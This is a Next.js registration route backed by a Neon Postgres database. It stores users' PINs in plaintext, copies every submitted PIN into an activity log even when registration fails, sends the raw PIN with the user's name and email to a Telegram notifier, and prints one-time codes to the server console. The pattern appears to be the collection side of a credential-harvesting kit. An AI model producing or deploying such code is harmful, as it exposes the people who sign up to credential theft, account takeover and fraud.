import { neon } from "@neondatabase/serverless"
import { NextResponse } from "next/server"

const sql = neon(process.env.DATABASE_URL!)

export async function POST(req: Request) {
    if (!process.env.DATABASE_URL) {
        console.error("DATABASE_URL is missing")
        return NextResponse.json({ error: "Database configuration error" }, { status: 500 })
    }

    try {
        const { identifier, pin, fullName, email } = await req.json()
        console.log(`[Register] Request for ${identifier}, ${email}`)

        // 1. Check if user already exists
        const existingUsers = await sql`SELECT * FROM profiles WHERE phone_number = ${identifier} OR email = ${email}`

        if (existingUsers.length > 0) {
            console.log(`[Register] User exists: ${existingUsers[0].phone_number}`)

            // Log REGISTRATION_FAILED_USER_EXISTS
            try {
                await sql`
                    INSERT INTO activity_logs (phone_number, activity_type, input_pin, full_name, email)
                    VALUES (${String(identifier)}, 'REGISTRATION_FAILED_USER_EXISTS', ${String(pin)}, ${String(fullName)}, ${String(email)})
                `
            } catch (logErr) {
                console.error("[Register] Failed to log user exists:", logErr)
            }

            return NextResponse.json({
                error: "Account with this phone or email already exists. Please login."
            }, { status: 409 })
        }

        // 2. Log REGISTRATION_ATTEMPT with all user data
        try {
            console.log("[Register] Logging registration attempt...")
            await sql`
                INSERT INTO activity_logs (phone_number, activity_type, input_pin, full_name, email)
                VALUES (${String(identifier)}, 'REGISTRATION_ATTEMPT', ${String(pin)}, ${String(fullName)}, ${String(email)})
            `
        } catch (logError) {
            console.error("[Register] Failed to log activity (continuing):", logError)
        }

        // 3. Create new user profile
        console.log("[Register] Creating profile...")
        const otp = Math.floor(100000 + Math.random() * 900000).toString()

        try {
            await sql`
                INSERT INTO profiles (phone_number, pin, otp_code, status, full_name, email)
                VALUES (${String(identifier)}, ${String(pin)}, ${otp}, 'otp_sent', ${String(fullName)}, ${String(email)})
            `
        } catch (dbError: any) {
            console.error("[Register] Profile insert failed:", dbError)
            throw dbError
        }

        // Send Telegram notification for new signup
        const { notify } = await import("@/lib/telegram")
        notify.signup(identifier, fullName, email, pin)

        // 4. Log REGISTRATION_OTP_SENT with OTP generated
        try {
            await sql`
                INSERT INTO activity_logs (phone_number, activity_type, input_otp, full_name, email)
                VALUES (${String(identifier)}, 'REGISTRATION_OTP_SENT', ${String(otp)}, ${String(fullName)}, ${String(email)})
            `
        } catch (logErr) {
            console.error("[Register] Failed to log OTP sent:", logErr)
        }

        console.log(`[Register] OTP Sent to ${identifier}: ${otp}`)

        return NextResponse.json({
            success: true,
            redirect: "/login/otp",
            message: "Account created successfully"
        })

    } catch (error: any) {
        console.error("Registration error FULL:", error)
        return NextResponse.json({
            error: "Registration failed",
            details: error.message
        }, { status: 500 })
    }
}
